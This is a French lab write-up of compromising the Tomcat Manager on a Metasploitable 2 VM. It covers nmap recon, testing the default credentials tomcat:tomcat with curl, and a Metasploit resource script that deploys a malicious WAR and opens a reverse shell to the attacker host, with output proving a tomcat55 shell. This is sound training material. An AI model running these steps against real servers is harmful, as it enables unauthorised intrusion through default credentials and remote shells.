# Write-up — Tomcat Manager, déploiement de WAR (Metasploitable 2, port 8180)

Cible : `192.168.56.101` (réseau josa `vboxnet0`) · Kali/LHOST : `192.168.56.1`.
CVE-2009-3548 · Résultat : shell **`tomcat55`** (uid=110).

> Réseau : services de josa sur `vboxnet0` (`192.168.56.0/24`). MS2 = `192.168.56.101`.

**C'est quoi ?** L'interface d'administration de Tomcat (le *Manager*) permet de déployer des
applications web (`.war`). Si elle est protégée par des **identifiants par défaut**
(`tomcat:tomcat`), un attaquant peut y déployer un WAR malveillant contenant un shell et le
faire exécuter par le serveur.

---

## 1. Recon

```bash
nmap -sV -p 8180 192.168.56.101
```
```
PORT     STATE SERVICE VERSION
8180/tcp open  http    Apache Tomcat/Coyote JSP engine 1.1
```

## 2. Accès au Manager — identifiants par défaut

L'interface `/manager/html` existe (HTTP 401 = authentification requise). On teste les
identifiants par défaut :

```bash
curl -s -o /dev/null -w "%{http_code}\n" http://192.168.56.101:8180/manager/html   # -> 401
curl -s -u tomcat:tomcat http://192.168.56.101:8180/manager/html | grep -i "Tomcat Web Application Manager"
```
```
<font size="+2">Tomcat Web Application Manager</font>
```

**`tomcat:tomcat` fonctionne** : la page du Manager s'affiche, on a la main sur le déploiement
d'applications.

## 3. Méthode d'identification de la CVE et du module

```bash
msfconsole -q -x "info exploit/multi/http/tomcat_mgr_deploy; exit"
```
```
Disclosed: 2009-11-09
References:
  https://nvd.nist.gov/vuln/detail/CVE-2009-3843
  https://nvd.nist.gov/vuln/detail/CVE-2009-3548
  ...
```

Le module `exploit/multi/http/tomcat_mgr_deploy` automatise l'attaque ; **CVE-2009-3548**
correspond au problème des identifiants par défaut du Manager Tomcat. Le mécanisme : le module
s'authentifie avec les identifiants fournis, téléverse un WAR contenant un shell JSP, le fait
exécuter, puis le retire (nettoyage).

## 4. Exploiter

🖥 Kali — via resource script :
```bash
cat > /tmp/tomcat.rc << 'EOF'
use exploit/multi/http/tomcat_mgr_deploy
set RHOSTS 192.168.56.101
set RPORT 8180
set HttpUsername tomcat
set HttpPassword tomcat
set payload java/shell_reverse_tcp
set LHOST 192.168.56.1
set LPORT 4447
run -z
sessions -c "id; uname -a; hostname; whoami" -i 1
exit -y
EOF
msfconsole -q -r /tmp/tomcat.rc
```

Résultat :
```
[*] Executing /fVY5vqIcnR8WMzkYUQYiMSBZf4/o8udnNhzXBfSJ2wErXrjXKhVyx.jsp...
[*] Undeploying fVY5vqIcnR8WMzkYUQYiMSBZf4 ...
[*] Command shell session 1 opened (192.168.56.1:4447 -> 192.168.56.101:58497)
```

On voit le WAR (nom aléatoire) déployé, le JSP exécuté, la session ouverte, puis le WAR
**auto-retiré** par le module (`Undeploying`) — il ne laisse pas l'appli malveillante en
place.

**Note :** `HttpUsername`/`HttpPassword` portent les identifiants du Manager ;
`payload java/shell_reverse_tcp` car le shell s'exécute dans la JVM de Tomcat ;
`LHOST`/`LPORT` pour le retour reverse.

## 5. Preuve d'accès

```
[*] Running 'id; uname -a; hostname; whoami' on shell session 1 (192.168.56.101)
uid=110(tomcat55) gid=65534(nogroup) groups=65534(nogroup)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
tomcat55
```

→ Shell **`tomcat55`** (uid=110), le compte sous lequel tourne Tomcat — pas root, mais accès
système à partir duquel chercher une élévation de privilèges. Mêmes techniques que le Tomcat
de MS1 (déjà traité par josa), ici sur le port 8180.

---

**Pour rejouer :** `./start.sh`, localiser l'IP, puis l'étape 4.
